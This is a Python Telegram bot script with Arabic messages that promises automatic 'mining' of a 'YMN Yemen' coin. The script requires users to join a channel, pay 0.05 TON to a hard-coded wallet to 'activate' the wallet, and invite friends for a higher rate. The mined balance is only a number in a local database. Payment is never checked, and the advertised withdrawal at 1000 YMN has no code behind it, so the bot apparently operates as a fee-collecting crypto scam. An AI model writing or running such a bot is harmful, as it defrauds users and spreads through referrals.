import os, time, sqlite3
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHANNEL = "@YemenYMN"
ACTIVATION_WALLET = "UQCxaTPvhxEZQ3GdE4wxIHRxhvIqBqBpEQx0LpXK6L6ym6FZ"

db = sqlite3.connect("ymn.db", check_same_thread=False)
db.execute("""CREATE TABLE IF NOT EXISTS users(
user_id INTEGER PRIMARY KEY, username TEXT, balance REAL DEFAULT 0,
last_claim REAL DEFAULT 0, active INTEGER DEFAULT 0,
referrals INTEGER DEFAULT 0, referred_by INTEGER, wallet TEXT)""")
db.commit()

def get_user(uid):
    c = db.cursor()
    c.execute("SELECT * FROM users WHERE user_id=?", (uid,))
    u = c.fetchone()
    if not u:
        c.execute("INSERT INTO users(user_id) VALUES(?)", (uid,))
        db.commit()
        c.execute("SELECT * FROM users WHERE user_id=?", (uid,))
        u = c.fetchone()
    return u

def mining_rate(user):
    return 5 + user[5] * 1

async def check_joined(context, user_id):
    try:
        m = await context.bot.get_chat_member(CHANNEL, user_id)
        return m.status in ["member","administrator","creator"]
    except:
        return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    args = context.args
    user = get_user(uid)
    if args and args[0].isdigit() and int(args[0]) != uid:
        ref_id = int(args[0])
        if user[6] is None:
            db.execute("UPDATE users SET referred_by=? WHERE user_id=?", (ref_id, uid))
            db.execute("UPDATE users SET referrals=referrals+1 WHERE user_id=?", (ref_id,))
            db.commit()
            await context.bot.send_message(ref_id, f"🎉 صديق جديد انضم من رابطك! سرعتك زادت +1 YMN/ساعة")
    kb = [
        [InlineKeyboardButton("📢 قناتنا", url="https://t.me/YemenYMN")],
        [InlineKeyboardButton("✅ اشتركت في القناة", callback_data="check_join")],
    ]
    await update.message.reply_text(
        f"🇾🇪 *أهلا بك في بوت YMN اليمن!*\n\n"
        f"🪙 تعدين تلقائي لعملة YMN\n"
        f"🎁 اشترك في القناة = +2 YMN هدية\n"
        f"👥 كل صديق = +1 YMN/ساعة\n"
        f"💰 السحب من 1000 YMN\n\n"
        f"*الخطوة 1:* اشترك في القناة واضغط ✅",
        reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    user = get_user(uid)
    await q.answer()
    if q.data == "check_join":
        if not await check_joined(context, uid):
            await q.edit_message_text(f"❌ لسه ما اشتركت!\nاشترك في @YemenYMN واضغط ✅ مرة ثانية")
            return
        if user[2] == 0:
            db.execute("UPDATE users SET balance=balance+2 WHERE user_id=?", (uid,))
            db.commit()
            bonus = "\n🎁 حصلت على +2 YMN هدية الاشتراك!"
        else:
            bonus = ""
        kb = [[InlineKeyboardButton("✅ دفعت 0.05 TON", callback_data="paid")]]
        await q.edit_message_text(
            f"*الخطوة 2: تفعيل المحفظة*{bonus}\n\n"
            f"رصيدك: 2 YMN\n"
            f"ارسل *0.05 TON* الى:\n"
            f"`{ACTIVATION_WALLET}`\n\n"
            f"بعد الدفع اضغط ✅ دفعت",
            reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    elif q.data == "paid":
        db.execute("UPDATE users SET active=1, last_claim=? WHERE user_id=?", (time.time(), uid))
        db.commit()
        await q.edit_message_text("✅ *تم تفعيل محفظتك!*\n\n⛏️ التعدين بدأ!\nاستخدم /mine عشان تجمع", parse_mode="Markdown")

async def mine(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    user = get_user(uid)
    if not user[4]:
        await update.message.reply_text("❌ فعل محفظتك اولاً - اكتب /start")
        return
    now = time.time()
    hours = (now - user[3]) / 3600
    rate = mining_rate(user)
    earned = hours * rate
    new_bal = user[2] + earned
    db.execute("UPDATE users SET balance=?, last_claim=? WHERE user_id=?", (new_bal, now, uid))
    db.commit()
    await update.message.reply_text(f"⛏️ *تعدين YMN*\n\nرصيدك: `{new_bal:.2f} YMN`\nسرعتك: `{rate} YMN/ساعة`\nاصدقائك: `{user[5]}`", parse_mode="Markdown")

async def invite(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    me = await context.bot.get_me()
    link = f"https://t.me/{me.username}?start={uid}"
    await update.message.reply_text(f"👥 *رابط دعوتك:*\n`{link}`\n\nكل صديق = +1 YMN/ساعة!", parse_mode="Markdown")

if __name__ == "__main__":
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("mine", mine))
    app.add_handler(CommandHandler("invite", invite))
    app.add_handler(CallbackQueryHandler(on_button))
    print("Bot Started")
    app.run_polling()
